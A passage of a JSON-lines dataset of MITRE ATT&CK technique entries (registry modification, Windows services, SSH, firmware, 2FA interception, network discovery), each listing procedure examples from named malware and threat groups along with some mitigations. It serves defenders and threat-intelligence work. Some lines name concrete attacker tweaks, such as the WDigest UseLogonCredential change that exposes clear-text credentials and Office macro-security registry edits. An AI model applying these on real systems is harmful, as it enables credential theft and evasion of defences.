vulnerabilities CVE-2010-0232 or CVE-2010-4398.", "Siloscape has leveraged a vulnerability in Windows containers to perform an Escape to Host.", "APT28 has exploited CVE-2014-4076, CVE-2015-2387, CVE-2015-1701, CVE-2017-0263 to escalate privileges.", "APT32 has used CVE-2016-7255 to escalate privileges.", "Remsec has a plugin to drop and execute vulnerable Outpost Sandbox or avast! Virtualization drivers in order to gain kernel mode privileges.", "APT33 has used a publicly available exploit for CVE-2017-0213 to escalate privileges on a local system.", "PoshC2 contains modules for local privilege escalation exploits such as CVE-2016-9192 and CVE-2016-0099.", "Wingbird exploits CVE-2016-4117 to allow an executable to gain escalated privileges.", "ProLock can use CVE-2019-0859 to escalate privileges on a compromised host.", "Empire can exploit vulnerabilities such as MS16-032 and MS16-135.", "Consider blocking the execution of known vulnerable drivers that adversaries may exploit to execute code in kernel mode. Validate driver block rules in audit mode to ensure stability prior to production deployment.", "ZIRCONIUM has exploited CVE-2017-0005 for local privilege escalation.", "Whitefly has used an open-source tool to exploit a known Windows privilege escalation vulnerability (CVE-2016-0051) on unpatched computers.\t"], "is_subtechnique": false}
{"text": " Adversaries may target two-factor authentication mechanisms, such as smart cards, to gain access to credentials that can be used to access systems, services, and network resources. Use of two or multi-factor authentication (2FA or MFA) is recommended and provides a higher level of security than user names and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. If a smart card is used for two-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. (Citation: Mandiant M Trends 2011) Adversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). (Citation: GCN RSA June 2011) Other methods of 2FA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Although primarily focused on", "idx": "https://attack.mitre.org/techniques/T1111", "title": "Two-Factor Authentication Interception", "entity": "Two-Factor Authentication Interception", "entity_type": "techniques", "entity_context": ["Operation Wocao has used a custom collection method to intercept two-factor authentication soft tokens.", "Chimera has registered alternate phone numbers for compromised users to intercept 2FA codes sent via SMS.", "Sykipot is known to contain functionality that enables targeting of smart card technologies to proxy authentication for connections to restricted network resources using detected hardware tokens.", "Remove smart cards when not in use."], "is_subtechnique": false}
{"text": " An adversary may attempt to discover resources that are available within an infrastructure-as-a-service (IaaS) environment. This includes compute service resources such as instances, virtual machines, and snapshots as well as resources of other services including the storage and database services. Cloud providers offer methods such as APIs and commands issued through CLIs to serve information about infrastructure. For example, AWS provides a <code>DescribeInstances</code> API within the Amazon EC2 API that can return information about one or more instances within an account, the <code>ListBuckets</code> API that returns a list of all buckets owned by the authenticated sender of the request, or the <code>GetPublicAccessBlock</code> API to retrieve access block configuration for a bucket (Citation: Amazon Describe Instance)(Citation: Amazon Describe Instances API)(Citation: AWS Get Public Access Block). Similarly, GCP's Cloud SDK CLI provides the <code>gcloud compute instances list</code> command to list all Google Compute Engine instances in a project (Citation: Google Compute Instances), and Azure's CLI command <code>az vm list</code> lists details of virtual machines.(Citation: Microsoft AZ CLI) An adversary may enumerate resources using a compromised user's access keys to determine which are available to that user.(Citation: Expel IO Evil in AWS) The discovery of these available resources may help adversaries determine their next steps in the Cloud environment, such as establishing Persistence.(Citation: Mandiant M-Trends 2020)An adversary may also use this information to change the configuration to make the bucket publicly accessible, allowing data to be accessed without authentication. Adversaries have also may use infrastructure discovery APIs such as <code>DescribeDBInstances</code> to determine size, owner, permissions, and network", "idx": "https://attack.mitre.org/techniques/T1580", "title": "Cloud Infrastructure Discovery", "entity": "Cloud Infrastructure Discovery", "entity_type": "techniques", "entity_context": ["Limit permissions to discover cloud infrastructure in accordance with least privilege. Organizations should limit the number of users within the organization with an IAM role that has administrative privileges, strive to reduce all permanent privileged role assignments, and conduct periodic entitlement reviews on IAM users, roles and policies."], "is_subtechnique": false}
{"text": " Adversaries may search DNS data for information about victims that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target’s subdomains, mail servers, and other hosts. Adversaries may search DNS data to gather actionable information. Threat actors can query nameservers for a target organization directly, or search through centralized repositories of logged DNS query responses (known as passive DNS).(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Adversaries may also seek and target DNS misconfigurations/leaks that reveal information about internal networks. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).", "idx": "https://attack.mitre.org/techniques/T1596/001", "title": "DNS/Passive DNS", "entity": "DNS/Passive DNS", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."], "is_subtechnique": true}
{"text": " Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution. Access to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API. Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps Hiding Reg Jul 2017) The Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication.", "idx": "https://attack.mitre.org/techniques/T1112", "title": "Modify Registry", "entity": "Modify Registry", "entity_type": "techniques", "entity_context": ["Cardinal RAT sets <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load</code> to point to its executable.", "TajMahal can set the <code>KeepPrintedJobs</code> attribute for configured printers in <code>SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Print\\\\Printers</code> to enable document stealing.", "Ursnif has used Registry modifications as part of its installation routine.", "GreyEnergy modifies conditions in the Registry and adds keys.", "SUNBURST had commands that allow an attacker to write or delete registry keys, and was observed stopping services by setting their <code>HKLM\\SYSTEM\\CurrentControlSet\\services\\\\service_name\\\\Start</code> registry entries to value 4. It also deleted previously-created Image File Execution Options (IFEO) Debugger registry values and registry keys related to HTTP proxy to clean up traces of its activity.", "Cobalt Strike can modify Registry values within <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\<Excel Version>\\Excel\\Security\\AccessVBOM\\</code> to enable the execution of additional code.", "APT19 uses a Port 22 malware variant to modify several Registry keys.", "Operation Wocao has enabled Wdigest by changing the registry value from 0 to 1.", "Conficker adds keys to the Registry at <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services</code> and various other Registry locations.", "HOPLIGHT has modified Managed Object Format (MOF) files within the Registry to run specific commands and create persistence on the system.\t", "KONNI has modified registry keys of ComSysApp service and Svchost on the machine to gain persistence.", "Stuxnet can create registry keys to load driver files.", "Gorgon Group malware can deactivate security mechanisms in Microsoft Office by editing several keys and values under <code>HKCU\\Software\\Microsoft\\Office\\</code>.", "Remcos has full control of the Registry, including the ability to modify it.", "Taidoor has the ability to modify the Registry on compromised hosts using <code>RegDeleteValueA</code> and <code>RegCreateKeyExA</code>.", "PlugX has a module to create, delete, or modify Registry keys.", "Catchamas creates three Registry keys to establish persistence by adding a Windows Service.", "Attor's dispatcher can modify the Run registry key.", "Pillowmint has stored its malicious payload in the registry key <code>HKLM\\SOFTWARE\\Microsoft\\DRM</code>.", "Once Shamoon has access to a network share, it enables the RemoteRegistry service on the target system. It will then connect to the system with RegConnectRegistryW and modify the Registry to disable UAC remote restrictions by setting <code>SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy</code> to 1.", "Grandoreiro can store its configuration in the Registry at <code>HKCU\\Software\\</code> under frequently changing names including <code>%USERNAME%</code> and <code>ToolTech-RM</code>.", "QuasarRAT has a command to edit the Registry on the victim’s machine.", "Blue Mockingbird has used Windows Registry modifications to specify a DLL payload.\t", "BitPaymer can set values in the Registry to help in execution. ", "FELIXROOT deletes the Registry key <code>HKCU\\Software\\Classes\\Applications\\rundll32.exe\\shell\\open</code>.", "zwShell can modify the Registry.", "gh0st RAT has altered the InstallTime subkey.", "FIN8 has deleted Registry keys during post compromise cleanup activities.", "HyperStack can add the name of its communication pipe to <code>HKLM\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\lanmanserver\\\\parameters\\NullSessionPipes</code>.", "Lokibot has modified the Registry as part of its UAC bypass process. ", "REvil can save encryption parameters and system information to the Registry.", "Metamorfo has written process names to the Registry, disabled IE browser features, deleted Registry keys, and changed the ExtendedUIHoverTime key.", "Exaramel for Windows adds the configuration to the Registry in XML format.", "A Patchwork payload deletes Resiliency Registry keys created by Microsoft Office applications in an apparent effort to trick users into thinking there were no issues during application runs.", "SMOKEDHAM has modified registry keys for persistence, to enable credential caching for credential access, and to facilitate lateral movement via RDP.", "CSPY Downloader can write to the Registry under the <code>%windir%</code> variable to execute tasks.", "Caterpillar WebShell has a command to modify a Registry key.", "PipeMon has stored its encrypted payload in the Registry.", "Nerex creates a Registry subkey that registers a new service.", "Agent Tesla can achieve persistence by modifying Registry key entries. ", "Rover has functionality to remove Registry Run key persistence as a cleanup procedure.", "PoisonIvy creates a Registry subkey that registers a new system device.", "Wizard Spider has modified the Registry key <code>HKLM\\System\\CurrentControlSet\\Control\\SecurityProviders\\WDigest</code> by setting the <code>UseLogonCredential</code> registry value to <code>1</code> in order to force credentials to be stored in clear text in memory.", "Zeus Panda modifies several Registry keys under <code>HKCU\\Software\\Microsoft\\Internet Explorer\\ PhishingFilter\\</code> to disable phishing filters.", "TYPEFRAME can install encrypted configuration data under the Registry key <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellCompatibility\\Applications\\laxhost.dll</code> and <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PrintConfigs</code>.", "Bankshot writes data into the Registry key <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Pniumj</code>.", "Reg may be used to interact with and modify the Windows Registry of a local or remote system at the command-line interface.", "EVILNUM can make modifications to the Regsitry for persistence.", "Kimsuky has modified Registry settings for default file associations to enable the opening of malicious documents.", "Regin appears to have functionality to modify remote Registry information.", "NanoCore has the capability to edit the Registry.", "Hydraq creates a Registry subkey to register its created service, and can also uninstall itself later by deleting this value. Hydraq's backdoor also enables remote attackers to modify and delete subkeys.", "RTM can delete all Registry entries created during its execution.", "Clop can make modifications to Registry keys. ", "APT32's backdoor has modified the Windows Registry to store the backdoor's configuration. \t\n", "Pysa has modified the registry key “SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System” and added the ransom note. ", "Avaddon modifies several registry keys for persistence and UAC bypass.", "PolyglotDuke can write encrypted JSON configuration files to the Registry.", "PHOREAL is capable of manipulating the Registry.", "StreamEx has the ability to modify the Registry.", "TEARDROP modified the Registry to create a Windows service for itself on a compromised host.", "Chaes stored its instructions in a config file in the Registry. ", "ComRAT has encrypted and stored its orchestrator code in the Registry as well as a PowerShell script into the WsqmCons Registry key. ", "Netwalker can add the following registry entry: <code>HKEY_CURRENT_USER\\SOFTWARE\\{8 random characters}</code>.", "Mosquito stores configuration values under the Registry key <code>HKCU\\Software\\Microsoft\\dllname</code> and modifies Registry keys under <code>HKCR\\CLSID\\...\\InprocServer32</code>with a path to the launcher.", "KEYMARBLE has a command to create Registry entries for storing data under <code>HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\WABE\\DataPath</code>.", "NETWIRE stores its configuration file within the Registry.", "ShadowPad maintains a configuration block and virtual file system in the Registry.", "Sibot has installed a second-stage script in the <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\sibot</code> registry key.", "PLAINTEE uses <code>reg add</code> to add a Registry Run key for persistence.", "ADVSTORESHELL is capable of setting and deleting Registry values.", "A Threat Group-3390 tool can create a new Registry key under <code>HKEY_CURRENT_USER\\Software\\Classes\\</code>.", "CrackMapExec can create a registry key using wdigest.", "APT38 uses a tool called CLEANTOAD that has the capability to modify Registry keys.", "LoJax has modified the Registry key <code>‘HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute’</code> from <code>‘autocheck autochk *’</code> to <code>‘autocheck autoche *’</code>.", "TrickBot can modify registry entries.", "BADCALL modifies the firewall Registry key <code>SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfileGloballyOpenPorts\\\\List</code>.", "Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation.", "Volgmer stores the encoded configuration file in the Registry key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Security</code>.", "CHOPSTICK may store RC4 encrypted configuration information in the Windows Registry.", "Silence can create, delete, or modify a specified Registry key or value.", "SOUNDBITE is capable of modifying the Registry.", "SynAck can manipulate Registry keys.", "QUADAGENT modifies an HKCU Registry key to store a session identifier unique to the compromised system as well as a pre-shared key used for encrypting and decrypting C2 communications.", "BACKSPACE is capable of deleting Registry keys, sub-keys, and values on a victim system.", "DarkComet adds a Registry value for its installation routine to the Registry Key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System Enable LUA=”0”</code> and <code>HKEY_CURRENT_USER\\Software\\DC3_FEXEC</code>.", "Gamaredon Group has removed security settings for VBA macro execution by changing registry values <code>HKCU\\Software\\Microsoft\\Office\\&lt;version&gt;\\&lt;product&gt;\\Security\\VBAWarnings</code> and <code>HKCU\\Software\\Microsoft\\Office\\&lt;version&gt;\\&lt;product&gt;\\Security\\AccessVBOM</code>.", "Turla has used the Registry to store encrypted payloads.", "Valak has the ability to modify the Registry key <code>HKCU\\Software\\ApplicationContainer\\Appsw64</code> to store information regarding the C2 server and downloads.", "SLOTHFULMEDIA can add, modify, and/or delete registry keys. It has changed the proxy configuration of a victim system by modifying the <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap</code> registry.", "Dragonfly 2.0 modified the Registry to perform multiple techniques through the use of Reg.", "PowerShower has added a registry key so future powershell.exe instances are spawned off-screen by default, and has removed all registry entries that are left behind during the dropper process.", "RegDuke can store its encryption key in the Registry.", "ShimRat has registered two registry keys for shim databases.", "InvisiMole has a command to create, set, copy, or delete a specified Registry key or value.", "PoetRAT has made registry modifications to alter its behavior upon execution.", "MegaCortex has added entries to the Registry for ransom contact information.", "Crimson can set a Registry key to determine how long it has been installed and possibly to indicate the version number.", "njRAT can create, delete, or modify a specified Registry key or value.", "Honeybee uses a batch file that modifies Registry keys to launch a DLL into the svchost.exe process.", "APT41 used a malware variant called GOODLUCK to modify the registry in order to steal credentials.", "QakBot can store its configuration information in a randomly named subkey under <code>HKCU\\Software\\Microsoft</code>.", "WastedLocker can modify registry values within the <code>Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap</code> registry key.", "Naid creates Registry entries that store information about a created service and point to a malicious DLL dropped to disk.", "Explosive has a function to write itself to Registry values. "], "is_subtechnique": false}
{"text": " Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry. Service configurations can be modified using utilities such as sc.exe and [Reg](https://attack.mitre.org/software/S0075). Adversaries may install a new service or modify an existing service by using system utilities to interact with services, by directly modifying the Registry, or by using custom tools to interact with the Windows API. Adversaries may configure services to execute at startup in order to persist on a system. An adversary may also incorporate [Masquerading](https://attack.mitre.org/techniques/T1036) by using a service name from a related operating system or benign software, or by modifying existing services to make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used. Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).", "idx": "https://attack.mitre.org/techniques/T1543/003", "title": "Windows Service", "entity": "Windows Service", "entity_type": "techniques", "entity_context": ["SLOTHFULMEDIA has created a service on victim machines named \"TaskFrame\" to establish persistence.", "If running as administrator, TDTESS installs itself as a new service named bmwappushservice to establish persistence.", "Emissary is capable of configuring itself as a service.", "AuditCred is installed as a new service on the system.", "Volgmer installs a copy of itself in a randomly selected service, then overwrites the ServiceDLL entry in the service's Registry entry. Some Volgmer variants also install .dll files as services with names generated by a list of hard-coded strings.", "Nebulae can create a service to establish persistence.", "A Threat Group-3390 tool can create a new service, naming it after the config information, to gain persistence.", "TrickBot establishes persistence by creating an autostart service that allows it to run whenever the machine boots.", "Stuxnet uses a driver registered as a boot start service as the main load-point.", "Several Lazarus Group malware families install themselves as new services on victims.", "hcdLoader installs itself as a service for persistence.", "Shamoon creates a new service named “ntssrv” to execute the payload. Newer versions create the \"MaintenaceSrv\" and \"hdv_725x\" services.", "PROMETHIUM has created new services and modified existing services for persistence.", "CosmicDuke uses Windows services typically named \"javamtsup\" for persistence.", "Carbon establishes persistence by creating a service and naming it based off the operating system version running on the current machine.", "Bankshot can terminate a specific process by its process id.", "RawPOS installs itself as a service to maintain persistence.", "AppleJeus can install itself as a service. ", "Seasalt is capable of installing itself as a service.", "gh0st RAT can create a new service to establish persistence.", "APT32 modified Windows Services to ensure PowerShell scripts were loaded on the system. APT32 also creates a Windows service to establish persistence.", "Kwampirs creates a new service named WmiApSrvEx to establish persistence.", "Reaver installs itself as a new service.", "One variant of BlackEnergy creates a new service using either a hard-coded or randomly generated name.", "PsExec can leverage Windows services to escalate privileges from administrator to SYSTEM with the <code>-s</code> argument.", "Empire can utilize built-in modules to modify service binaries and restore them to their original state.", "Emotet has been observed creating new services to maintain persistence.  ", "BBSRAT can modify service configurations.", "RainyDay can use services to establish persistence.", "TYPEFRAME variants can add malicious DLL modules as new services.TYPEFRAME can also delete services from the victim’s machine.", "Anchor can establish persistence by creating a service.\t", "Conficker copies itself into the <code>%systemroot%\\system32</code> directory and registers as a service.", "One persistence mechanism used by CozyCar is to register itself as a Windows service.", "Nerex creates a Registry subkey that registers a new service.", "WastedLocker created and established a service that runs until the encryption process is complete. ", "An APT19 Port 22 malware variant registers itself as a service.", "Tropic Trooper has installed a service pointing to a malicious DLL dropped to disk.", "Nidiran can create a new service named msamger (Microsoft Security Accounts Manager).", "Cuba can modify services by using the <code>OpenService</code> and <code>ChangeServiceConfig</code> functions. ", "BitPaymer has attempted to install itself as a service to maintain persistence.", "Briba installs a service pointing to a malicious DLL dropped to disk.", "JHUHUGIT has registered itself as a service to establish persistence.", "MoonWind installs itself as a new service with automatic startup to establish persistence. The service checks every 60 seconds to determine if the malware is running; if not, it will spawn a new instance.", "InvisiMole can register a Windows service named CsPower as part of its execution chain, and a Windows service named clr_optimization_v2.0.51527_X86 to achieve persistence.", "Some InnaputRAT variants create a new Windows service to establish persistence.", "TinyZBot can install as a Windows service for persistence.", "TeamTNT uses malware that adds cryptocurrency miners as a service.", "Kazuar can install itself as a new service.", "Ke3chang backdoor RoyalDNS established persistence through adding a service called <code>Nwsapagent</code>.", "Ragnar Locker has used sc.exe to create a new service for the VirtualBox driver.", "Some Sakula samples install themselves as services for persistence by calling WinExec with the <code>net start</code> argument.", "PlugX can be added as a service to establish persistence. PlugX also has a module to change service configurations as well as start, control, and delete services.", "Wingbird uses services.exe to register a new autostart service named \"Audit Service\" using a copy of the local lsass.exe file.", "FIN7 created new Windows services and added them to the startup directories for persistence.", "GoldenSpy has established persistence by running in the background as an autostart service.\t", "Naid creates a new service to establish.", "zwShell has established persistence by adding itself as a new service.", "APT3 has a tool that creates a new service for persistence.", "GreyEnergy chooses a service, drops a DLL file, and writes it to that serviceDLL Registry key.", "Catchamas adds a new service named NetAdapter to establish persistence.", "RDAT has created a service when it is installed on the victim machine.\t", "Use auditing tools capable of detecting privilege and service abuse opportunities on systems within an enterprise and correct them. ", "FinFisher creates a new Windows service with the malicious executable for persistence.", "PowerSploit contains a collection of Privesc-PowerUp modules that can discover and replace/modify service binaries, paths, and configs.", "ShimRat has installed a Windows service to maintain persistence on victim machines.", "Carbanak malware installs itself as a service to provide persistence and SYSTEM privileges.", "PipeMon can establish persistence by registering a malicious DLL as an alternative Print Processor which is loaded when the print spooler service starts.", "Dtrack can add a service called WBService to establish persistence.", "APT38 has installed a new Windows service to establish persistence.", "ZxShell can create a new service using the service parser function ProcessScCommand. ", "Duqu creates a new service that loads a malicious driver when the system starts. When Duqu is active, the operating system believes that the driver is legitimate, as it has been signed with a valid private key.", "FALLCHILL has been installed as a Windows service.", "WannaCry creates the service \"mssecsvc2.0\" with the display name \"Microsoft Security Center (2.0) Service.\"", "Dyre registers itself as a service by adding several Registry keys.", "Winnti for Windows sets its DLL file as a new service in the Registry to establish persistence.", "Attor's dispatcher can establish persistence by registering a new service.", "Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service configurations. ", "Cobalt Group has created new services to establish persistence.", "ZeroT can add a new service to ensure PlugX persists on the system when delivered as another payload onto the system.", "To establish persistence, Okrum can install itself as a new service named NtmSsvc.", "Kimsuky has created new services for persistence.", "Industroyer can use an arbitrary system service to load at system boot for persistence and replaces the ImagePath registry value of a Windows service with a new backdoor binary. ", "StreamEx establishes persistence by installing a new service pointing to its DLL and setting the service to auto-start.", "ZLib creates Registry keys to allow itself to run as various services.", "KeyBoy installs a service pointing to a malicious DLL dropped to disk.", "APT41 modified legitimate Windows services to install malware backdoors. APT41 created the StorSyncSvc service to provide persistence for Cobalt Strike.", "Wizard Spider has installed TrickBot as a service named ControlServiceA in order to establish persistence.", "Hydraq creates new services to establish persistence.", "Wiarp creates a backdoor through which remote attackers can create a service.", "StrongPity has created new services and modified existing services for persistence.", "Elise configures itself as a service.", "The Exaramel for Windows dropper creates and starts a Windows service named wsmprovav with the description “Windows Check AV.”", "Ursnif has registered itself as a system service in the Registry for automatic execution at system startup.", "DarkVishnya created new services for shellcode loaders distribution.", "Honeybee has batch files that modify the system service COMSysApp to load a malicious DLL.", "Blue Mockingbird has made their XMRIG payloads persistent as a Windows Service.", "PoisonIvy creates a Registry subkey that registers a new service. PoisonIvy also creates a Registry entry modifying the Logical Disk Manager service to point to a malicious DLL dropped to disk.", "TEARDROP ran as a Windows service from the <code>c:\\windows\\syswow64</code> folder.", "Cobalt Strike can install a new service.", "LoudMiner can automatically launch a Linux virtual machine as a service at startup if the AutoStart option is enabled in the VBoxVmService configuration file."], "is_subtechnique": true}
{"text": " Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user. SSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user’s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user.", "idx": "https://attack.mitre.org/techniques/T1021/004", "title": "SSH", "entity": "SSH", "entity_type": "techniques", "entity_context": ["Empire contains modules for executing commands over SSH as well as in-memory VNC agent injection.", "Leviathan used ssh for internal reconnaissance.", "TEMP.Veles has relied on encrypted SSH-based tunnels to transfer tools and for remote command/program execution.", "Disable the SSH daemon on systems that do not require it. For macOS ensure Remote Login is disabled under Sharing Preferences.", "Fox Kitten has used the PuTTY and Plink tools for lateral movement.", "FIN7 has used SSH to move laterally through victim environments.", "Cobalt Strike can SSH to a remote service.", "OilRig has used Putty to access compromised systems.", "Kinsing has used SSH for lateral movement.", "GCMAN uses Putty for lateral movement.", "Limit which user accounts are allowed to login via SSH.", "TeamTNT has used SSH to connect back to victim machines.", "menuPass has used Putty Secure Copy Client (PSCP) to transfer data.", "Require multi-factor authentication for SSH connections wherever possible, such as password protected SSH keys.", "APT39 used secure shell (SSH) to move laterally among their targets.", "Rocke has spread its coinminer via SSH.\t"], "is_subtechnique": true}
{"text": " Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer. (Citation: Wikipedia BIOS) (Citation: Wikipedia UEFI) (Citation: About UEFI) System firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.", "idx": "https://attack.mitre.org/techniques/T1542/001", "title": "System Firmware", "entity": "System Firmware", "entity_type": "techniques", "entity_context": ["LoJax is a UEFI BIOS rootkit deployed to persist remote access software on some targeted systems. ", "Prevent adversary access to privileged accounts or access necessary to perform this technique.", "Prevent adversary access to privileged accounts or access necessary to perform this technique. Check the integrity of the existing BIOS or EFI to determine if it is vulnerable to modification. Patch the BIOS and EFI as necessary. Use Trusted Platform Module technology. ", "Trojan.Mebromi performs BIOS modification and can download and execute a file as well as protect itself from removal.", "Hacking Team UEFI Rootkit is a UEFI BIOS rootkit developed by the company Hacking Team to persist remote access software on some targeted systems. ", "Patch the BIOS and EFI as necessary.", "Check the integrity of the existing BIOS or EFI to determine if it is vulnerable to modification. Use Trusted Platform Module technology.  Move system's root of trust to hardware to prevent tampering with the SPI flash memory. Technologies such as Intel Boot Guard can assist with this. "], "is_subtechnique": true}
{"text": " Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. An adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.(Citation: Amazon AWS VPC Guide)(Citation: Microsoft Azure Virtual Network Overview)(Citation: Google VPC Overview) Utilities and commands that acquire this information include [netstat](https://attack.mitre.org/software/S0104), \"net use,\" and \"net session\" with [Net](https://attack.mitre.org/software/S0039). In Mac and Linux, [netstat](https://attack.mitre.org/software/S0104) and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to \"net session\".", "idx": "https://attack.mitre.org/techniques/T1049", "title": "System Network Connections Discovery", "entity": "System Network Connections Discovery", "entity_type": "techniques", "entity_context": ["POWRUNER may collect active network connections by running <code>netstat -an</code> on a victim.", "Turla surveys a system upon check-in to discover active local network connections using the <code>netstat -an</code>, <code>net use</code>, <code>net file</code>, and <code>net session</code> commands. Turla RPC backdoors have also enumerated the IPv4 TCP connection table via the <code>GetTcpTable2</code> API call.", "After loading the keyword and phone data files, MESSAGETAP begins monitoring all network connections to and from the victim server. ", "The discovery modules used with Duqu can collect information on network connections.", "Chimera has used <code>netstat -ano | findstr EST</code> to discover network connections.", "Sykipot may use <code>netstat -ano</code> to display active network connections.", "SHOTPUT uses netstat to list TCP connection status.", "Cuba can use the function <code>GetIpNetTable</code> to recover the last connections to the victim's machine. ", "Machete uses the <code>netsh wlan show networks mode=bssid</code> and <code>netsh wlan show interfaces</code> commands to list all nearby WiFi networks and connected interfaces. ", "Remsec can obtain a list of active connections and open ports.", "GravityRAT uses the <code>netstat</code> command to find open ports on the victim’s machine.", "Epic uses the <code>net use</code>, <code>net session</code>, and <code>netstat</code> commands to gather information on network connections.", "Zebrocy uses <code>netstat -aon</code> to gather network connection information.", "Pupy has a built-in utility command for <code>netstat</code>, can do net session through PowerView, and has an interactive shell which can be used to discover additional information.", "NETWIRE can capture session logon details from a compromised host.", "Empire can enumerate the current network connections of a host.", "Sibot has retrieved a GUID associated with a present LAN connection on a compromised machine.", "Mustang Panda has used <code>netstat -ano</code> to determine network connection information.", "admin@338 actors used the following command following exploitation of a machine with LOWBALL malware to display network connections: <code>netstat -ano >> %temp%\\download</code>", "APT41 has enumerated IP addresses of network resources and used the <code>netstat</code> command as part of network reconnaissance. The group has also used a malware variant, HIGHNOON, to enumerate active RDP sessions.", "Carbon uses the <code>netstat -r</code> and <code>netstat -an</code> commands.", "Sandworm Team had gathered user, IP address, and server data related to RDP sessions on a compromised host. It has also accessed network diagram files useful for understanding how a host's network was configured. ", "netstat can be used to enumerate local network connections, including active TCP connections and other network statistics.", "Volgmer can gather information about TCP connection state.", "Operation Wocao has collected a list of open connections on the infected system using netstat and checks whether it has an internet connection.", "Commands such as <code>net use</code> and <code>net session</code> can be used in Net to gather information about network connections from a particular host.", "Ramsay can use <code>netstat</code> to enumerate network connections.", "MuddyWater has used a PowerShell backdoor to check for Skype connections on the target machine.", "BackdoorDiplomacy has 